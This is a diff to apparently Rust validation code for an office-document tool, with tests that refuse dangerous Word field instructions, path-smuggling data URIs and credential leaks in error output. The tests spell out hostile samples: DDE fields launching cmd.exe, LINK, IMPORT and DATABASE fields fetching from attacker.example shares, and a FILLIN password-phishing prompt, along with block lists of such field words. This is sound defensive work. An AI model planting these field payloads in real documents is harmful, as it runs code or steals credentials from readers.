@@ -322,9 +322,9 @@ fn property(key: &str) -> Property {
 
 /// A batch officecli may run: commands that change the document, whose
 /// values read nothing outside the document's folder and fetch nothing (a
-/// picture or any other file comes as a `data:` URI). A diagram is drawn
-/// with shapes: officecli would otherwise render it in a browser it starts,
-/// with mermaid.js from the network.
+/// picture or any other file comes as a `data:` URI), with no diagram or
+/// embedded object, and Word fields that only show a page number or a date
+/// (see [`refused_shape`]).
 fn check_batch(commands: &mut [Value]) -> Result<(), String> {
     if commands.is_empty() {
         return Err(refuse(
@@ -428,9 +428,90 @@ const REFUSED_TYPES: &[&str] = &[
 /// The Word fields a document may hold: they show a number or a date, and
 /// run nothing.
 const FIELD_NAMES: &[&str] = &["page", "numpages", "date", "time", "toc"];
-/// Field instructions that run a program, or fetch a file, when Word opens
-/// the document.
-const FIELD_CODES: &[&str] = &["DDEAUTO", "DDE ", "INCLUDEPICTURE", "INCLUDETEXT"];
+/// officecli's field types: each is also an element type `add` takes, and
+/// then reads its `code` as the raw field instruction.
+const FIELD_TYPES: &[&str] = &[
+    "field",
+    "page",
+    "pagenum",
+    "pagenumber",
+    "numpages",
+    "date",
+    "author",
+    "title",
+    "time",
+    "filename",
+    "section",
+    "sectionpages",
+    "mergefield",
+    "ref",
+    "pageref",
+    "noteref",
+    "seq",
+    "styleref",
+    "docproperty",
+    "if",
+    "createdate",
+    "savedate",
+    "printdate",
+    "edittime",
+    "lastsavedby",
+    "subject",
+    "numwords",
+    "numchars",
+    "revnum",
+    "template",
+    "comments",
+    "doccomments",
+    "keywords",
+];
+/// The properties officecli reads a field's name or instruction from.
+const FIELD_KEYS: &[&str] = &["instruction", "instr", "code", "field", "fieldtype"];
+/// Field instructions that run a program, fetch or link a file, or ask the
+/// reader for input; `INCLUDE…` too.
+const FIELD_WORDS: &[&str] = &[
+    "DDE",
+    "DDEAUTO",
+    "LINK",
+    "IMPORT",
+    "DATABASE",
+    "FILLIN",
+    "RD",
+    "HYPERLINK",
+    "AUTOTEXT",
+    "MACROBUTTON",
+    "EMBED",
+];
+/// Field instructions that must not appear in any property (R44).
+const FIELD_CODES: &[&str] = &["DDE", "DDEAUTO", "INCLUDEPICTURE", "INCLUDETEXT"];
+
+/// The words of a value as Word reads a field instruction: split at any
+/// whitespace, quote or brace.
+fn field_words(text: &str) -> impl Iterator<Item = String> + '_ {
+    text.split(|c: char| c.is_whitespace() || "\"'\u{201C}\u{201D}\u{2018}\u{2019}{}".contains(c))
+        .filter(|word| !word.is_empty())
+        .map(str::to_uppercase)
+}
+
+/// Whether a field's name or instruction only shows a page number or a
+/// date: its first word is one of [`FIELD_NAMES`], and no word runs,
+/// fetches or links anything.
+fn shows_only_a_number(text: &str) -> bool {
+    let mut words = field_words(text).peekable();
+    words
+        .peek()
+        .is_some_and(|first| FIELD_NAMES.contains(&first.to_lowercase().as_str()))
+        && words.all(|word| !FIELD_WORDS.contains(&word.as_str()) && !word.starts_with("INCLUDE"))
+}
+
+/// A property key as officecli names one: words of ASCII letters, digits
+/// and `_`, each starting with a letter, joined by `.` (`font.color`).
+fn is_property_key(key: &str) -> bool {
+    key.split('.').all(|part| {
+        part.starts_with(|c: char| c.is_ascii_alphabetic())
+            && part.chars().all(|c| c.is_ascii_alphanumeric() || c == '_')
+    })
+}
 
 /// An item's `type`, as officecli compares it.
 fn element_type(fields: &Map<String, Value>) -> String {
@@ -469,7 +550,7 @@ fn refused_shape(fields: &Map<String, Value>) -> Option<String> {
     };
     let mut seen = std::collections::HashSet::new();
     for (key, value) in props {
-        if key.is_empty() || !key.is_ascii() {
+        if !is_property_key(key) {
             return Some(format!("\"props.{key}\" is not a property name"));
         }
         if !seen.insert(key.to_ascii_lowercase()) {
@@ -478,31 +559,38 @@ fn refused_shape(fields: &Map<String, Value>) -> Option<String> {
         if value.is_object() || value.is_array() {
             return Some(format!("\"props.{key}\" must be a single value"));
         }
-        let text = value.as_str().unwrap_or_default().to_ascii_uppercase();
-        if FIELD_CODES.iter().any(|code| text.contains(code)) {
+        let text = value.as_str().unwrap_or_default();
+        let coded = field_words(text).any(|word| {
+            FIELD_CODES.contains(&word.as_str())
+                || word.starts_with("INCLUDEPICTURE")
+                || word.starts_with("INCLUDETEXT")
+        });
+        if coded {
             return Some(format!(
                 "\"props.{key}\" holds a field instruction that runs or fetches something"
             ));
         }
     }
-    // A field's name, wherever officecli reads one.
-    let field = element_type(fields) == "field";
-    let named: &[&str] = if field {
-        &["instruction", "instr", "code", "field", "fieldtype", "type"]
-    } else {
-        &["instruction", "instr", "field"]
-    };
-    let names: Vec<(&String, &Value)> = props
-        .iter()
-        .filter(|(key, _)| named.contains(&key.to_ascii_lowercase().as_str()))
-        .collect();
-    let allowed = |value: &Value| {
-        value
-            .as_str()
-            .is_some_and(|name| FIELD_NAMES.contains(&name.trim().to_ascii_lowercase().as_str()))
-    };
-    if (field && names.is_empty()) || names.iter().any(|(_, value)| !allowed(value)) {
-        return Some("a field can only be page, numpages, date, time or toc".into());
+    // A field's name or instruction, wherever officecli reads one: on any
+    // item, and in `type` of an element that is a field.
+    let kind = element_type(fields);
+    let field = FIELD_TYPES.contains(&kind.as_str());
+    let refused = "a field can only be page, numpages, date, time or toc, with nothing that runs, fetches or links";
+    if field && kind != "field" && !FIELD_NAMES.contains(&kind.as_str()) {
+        return Some(refused.into());
+    }
+    let mut named = false;
+    for (key, value) in props {
+        let key = key.to_ascii_lowercase();
+        if FIELD_KEYS.contains(&key.as_str()) || (field && key == "type") {
+            named = true;
+            if !value.as_str().is_some_and(shows_only_a_number) {
+                return Some(refused.into());
+            }
+        }
+    }
+    if kind == "field" && !named {
+        return Some(refused.into());
     }
     None
 }
@@ -554,11 +642,13 @@ fn refused_value(text: &str, class: Property) -> Option<&'static str> {
         }
         // `hh:mm`, `[h]:mm:ss`: a colon after date and time codes is no
         // scheme; every other check holds.
-        Property::NumberFormat => location(text, |token| {
+        // …unless what follows the colon starts like a path (`ssh://x`).
+        Property::NumberFormat => location(text, |token, rest| {
             is_scheme(token)
-                && !token
-                    .chars()
-                    .all(|c| "hmsdy".contains(c.to_ascii_lowercase()))
+                && (rest.starts_with('/')
+                    || !token
+                        .chars()
+                        .all(|c| "hmsdy".contains(c.to_ascii_lowercase())))
         })
         .then_some(elsewhere),
         Property::Fill | Property::Other => names_a_location(text).then_some(elsewhere),
@@ -578,12 +668,12 @@ fn is_scheme(name: &str) -> bool {
 /// has a `..` segment, or starts with a drive or a scheme other than
 /// `data:`. A cell range (`E2:L18`) is none.
 fn names_a_location(text: &str) -> bool {
-    location(text, is_scheme)
+    location(text, |name, _| is_scheme(name))
 }
 
 /// [`names_a_location`], with `scheme` deciding which token before a colon
 /// is a scheme's (or a drive's) name.
-fn location(text: &str, scheme: impl Fn(&str) -> bool) -> bool {
+fn location(text: &str, scheme: impl Fn(&str, &str) -> bool) -> bool {
     let path = text.trim().replace('\\', "/");
     let lower = path.to_ascii_lowercase();
     let unsigned = path.strip_prefix('-').unwrap_or(&path);
@@ -591,7 +681,9 @@ fn location(text: &str, scheme: impl Fn(&str) -> bool) -> bool {
         .strip_prefix('.')
         .unwrap_or(unsigned)
         .starts_with(|c: char| c.is_ascii_digit());
-    let scheme = lower.split_once(':').is_some_and(|(name, _)| scheme(name));
+    let scheme = lower
+        .split_once(':')
+        .is_some_and(|(name, rest)| scheme(name, rest));
     path.starts_with(['/', '~'])
         || (path.starts_with('.') && !number)
         || path.split('/').any(|part| part.trim() == "..")
@@ -666,18 +758,26 @@ fn links_a_slide(text: &str) -> bool {
 /// Whether a sheet the batch makes may start an element path: not a file
 /// system's first folder, and nothing that separates a path.
 fn may_root(name: &str) -> bool {
-    !name.contains(['/', '\\', ':']) && !FOLDER_NAMES.contains(&name.to_lowercase().as_str())
+    !name.contains(['/', '\\', ':']) && !FOLDER_NAMES.contains(&name.trim().to_lowercase().as_str())
 }
 
 /// `data:<type>/<subtype>[;…];base64,…`.
 fn is_data_uri(text: &str) -> bool {
     let lower = text.trim().to_ascii_lowercase();
-    let Some((head, _)) = lower
+    let Some((head, payload)) = lower
         .strip_prefix("data:")
         .and_then(|rest| rest.split_once(','))
     else {
         return false;
     };
+    // Base64 only: `data:…;base64,x/../../secret.png` is a path.
+    let base64 = payload
+        .trim_end_matches('=')
+        .chars()
+        .all(|c| c.is_ascii_alphanumeric() || c == '+' || c == '/');
+    if !base64 {
+        return false;
+    }
     let mut parts = head.split(';');
     let media = parts.next().unwrap_or_default();
     let valid = |part: &str| {
@@ -1610,7 +1710,7 @@ fn typst_failure(work: &Work<'_>, stderr: &str, body: &str) -> String {
         .filter(|line| !line.trim().is_empty())
         .filter_map(|line| match diagnostic(line) {
             Some(d) if d.severity == "warning" => None,
-            // Typst's words are scrubbed; the quoted line is the model's own.
+            // The quoted line is scrubbed too: it may hold a credential.
             Some(d) => Some(match body_line(d.line) {
                 Some(number) => {
                     let source = body.lines().nth(number - 1).unwrap_or_default().trim();
@@ -1619,7 +1719,7 @@ fn typst_failure(work: &Work<'_>, stderr: &str, body: &str) -> String {
                         d.column,
                         d.severity,
                         work.shown(d.message),
-                        clip(source, MAX_PATH_CHARS)
+                        work.shown(&clip(source, MAX_PATH_CHARS))
                     )
                 }
                 None => format!("{}: {}", d.severity, work.shown(d.message)),
@@ -3128,7 +3228,6 @@ esac"#,
             json!({"code": "INCLUDETEXT \"x.docx\""}),
             json!({"fieldType": "mergefield", "name": "CustomerName"}),
             json!({"type": "if", "expression": "1 = 1"}),
-            json!({"instruction": "PAGE \\* MERGEFORMAT"}),
             json!({"format": "yyyy"}),
         ] {
             assert!(checked(&[field(props.clone())]).is_err(), "{props}");
@@ -3222,6 +3321,205 @@ printf '%%PDF-1.7 /Type /Page' > "$last""#;
             "{error}"
         );
         assert!(error.contains("'<path>'"), "{error}");
+    }
+
+    /// Fix round 2: every field type officecli adds reads `code` as a raw
+    /// instruction; each residual the review found is refused.
+    #[test]
+    fn field_types_and_codes_are_checked_on_every_item() {
+        let item = |parent: &str, kind: &str, props: Value| json!({"command": "add", "parent": parent, "type": kind, "props": props});
+        let link = json!({"code": " LINK Excel.Sheet.12 \"\\\\\\\\attacker.example\\\\s\\\\x.xlsx\" \"Sheet1!R1C1\" \\a \\p "});
+        let import = json!({"code": " IMPORT \"\\\\\\\\attacker.example\\\\s\\\\x.png\" "});
+        let mut refused = vec![
+            item("/body/p[1]", "pagenum", link.clone()),
+            item("/body/p[1]", "page", import.clone()),
+            item(
+                "/body/p[1]",
+                "date",
+                json!({"code": " DATABASE \\d \"\\\\\\\\attacker.example\\\\s\\\\x.mdb\" \\s \"select 1\" "}),
+            ),
+            item(
+                "/body/p[1]",
+                "numpages",
+                json!({"code": " FILLIN \"Your session expired. Enter your password:\" "}),
+            ),
+            item(
+                "/body/p[1]",
+                "pagenumber",
+                json!({"code": " DDE\tc:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" "}),
+            ),
+            item(
+                "/body/p[1]",
+                "time",
+                json!({"code": " DDE\tc:\\\\windows\\\\system32\\\\cmd.exe \"/k calc.exe\" "}),
+            ),
+            item(
+                "/body/p[1]",
+                "time",
+                json!({"code": " RD \"\\\\\\\\attacker.example\\\\s\\\\x.docx\" "}),
+            ),
+            item("/body/p[1]", "field", json!({"code": " LINK x "})),
+            item(
+                "/body/p[1]",
+                "field",
+                json!({"instruction": "PAGE", "text": "DDEAUTO"}),
+            ),
+            item(
+                "/body/p[1]",
+                "field",
+                json!({"fieldType": "page", "code": " LINK x "}),
+            ),
+            item(
+                "/body/p[1]",
+                "page",
+                json!({"code": "PAGE \\* MERGEFORMAT INCLUDEPICTURE x"}),
+            ),
+            item("/body/p[1]", "date", json!({"instr": "DATE HYPERLINK x"})),
+            item("/body/p[1]", "time", json!({"field": "TIME MACROBUTTON x"})),
+            item("/body/p[1]", "date", json!({"code": "\u{3000}EMBED x"})),
+            item("/body", "paragraph", json!({"code": " AUTOTEXT x "})),
+            item("/body", "paragraph", json!({"text": "DDE\tc:\\x"})),
+            item(
+                "/body",
+                "paragraph",
+                json!({"text": "x", "fieldType": "author"}),
+            ),
+            item("/body/p[1]", "field", json!({"fieldType": 1})),
+        ];
+        for kind in [
+            "author",
+            "title",
+            "filename",
+            "sectionpages",
+            "createdate",
+            "savedate",
+            "printdate",
+            "edittime",
+            "numwords",
+            "template",
+        ] {
+            for parent in ["/body/p[1]", "/footer[1]/p[1]"] {
+                refused.push(item(parent, kind, link.clone()));
+                refused.push(item(parent, kind, json!({})));
+            }
+        }
+        for item in refused {
+            assert!(checked(std::slice::from_ref(&item)).is_err(), "{item}");
+        }
+        for item in [
+            item("/body/p[1]", "page", json!({"code": "PAGE"})),
+            item("/body/p[1]", "page", json!({})),
+            item(
+                "/body/p[1]",
+                "time",
+                json!({"code": " TIME \\@ \"HH:mm\" "}),
+            ),
+            item("/body/p[1]", "field", json!({"fieldType": "page"})),
+            item(
+                "/body/p[1]",
+                "field",
+                json!({"instruction": "PAGE \\* MERGEFORMAT"}),
+            ),
+            item(
+                "/body",
+                "paragraph",
+                json!({"text": "Click the link to import the database"}),
+            ),
+            item(
+                "/",
+                "footer",
+                json!({"type": "default", "text": "Page ", "field": "page"}),
+            ),
+        ] {
+            assert!(checked(std::slice::from_ref(&item)).is_ok(), "{item}");
+        }
+    }
+
+    #[test]
+    fn property_keys_and_data_uris_have_their_own_grammar() {
+        for props in [
+            json!({"data=/etc/hosts": "x"}),
+            json!({"data": "A,B", "data.": "/etc/hosts"}),
+            json!({".data": "x"}),
+            json!({"font..color": "x"}),
+            json!({"2x": "x"}),
+            json!({"src": "data:image/png;base64,x/../../../../private/tmp/probe-outside/secret.png"}),
+            json!({"src": "data:image/png;base64,AAAA BBBB"}),
+        ] {
+            let item =
+                json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": props});
+            assert!(checked(std::slice::from_ref(&item)).is_err(), "{item}");
+        }
+        let item = json!({"command": "add", "parent": "/slide[1]", "type": "picture", "props": {"src": "data:image/png;base64,iVBORw0KGgo=", "font.color": "1F4E79", "docDefaults.fontSize": "11pt"}});
+        assert!(checked(std::slice::from_ref(&item)).is_ok());
+    }
+
+    #[test]
+    fn number_formats_keep_their_colons_but_name_no_address() {
+        let refused = |format: &str| refused_value(format, Property::NumberFormat).is_some();
+        for format in [
+            "ssh://attacker/x",
+            "mms://x",
+            "hh:/etc/hosts",
+            "dd:/x",
+            "d:/x",
+            "file:x",
+        ] {
+            assert!(refused(format), "{format}");
+        }
+        for format in [
+            "[$-409]h:mm AM/PM",
+            "$#,##0",
+            "¥#,##0.00",
+            "h:mm:ss",
+            "mm:ss.0",
+            "[h]:mm",
+            "yyyy\"年\"m\"月\"",
+            "#,##0;[Red]-#,##0",
+            "0.00E+00",
+            "@",
+            "\"Total: \"0",
+            "[$€-2] #,##0.00",
+            "m/d/yyyy h:mm",
+        ] {
+            assert!(!refused(format), "{format}");
+        }
+        // A sheet named like a folder, whatever its case or spacing.
+        for name in ["tmp", "Tmp", "TMP", "tmp ", " private"] {
+            let mut commands = vec![
+                json!({"command": "add", "parent": "/", "type": "sheet", "props": {"name": name}}),
+                json!({"command": "set", "path": format!("/{name}/A1"), "props": {"value": "1"}}),
+            ];
+            assert!(check_batch(&mut commands).is_err(), "{name:?}");
+        }
+    }
+
+    #[tokio::test]
+    #[serial_test::serial(document_engines)]
+    async fn the_quoted_typst_line_is_scrubbed_too() {
+        let prelude = include_str!("pdf-prelude.typ").lines().count();
+        let f = fixture(
+            None,
+            Some(&format!(
+                "echo 'main.typ:{}:1: error: unknown variable: x' >&2; exit 1",
+                prelude + 1
+            )),
+        );
+        let error = f
+            .call(
+                "call-1",
+                json!({"name": "r", "format": "pdf", "content": "#x api_key=sk-live-abcdefghijklmnopqrstuvwxyz0123"}),
+            )
+            .await
+            .unwrap_err();
+        assert!(
+            error.contains("line 1, column 1: error: unknown variable"),
+            "{error}"
+        );
+        assert!(
+            !error.contains("sk-live-abcdefghijklmnopqrstuvwxyz0123"),
+            "{error}"
+        );
     }
 
     #[test]
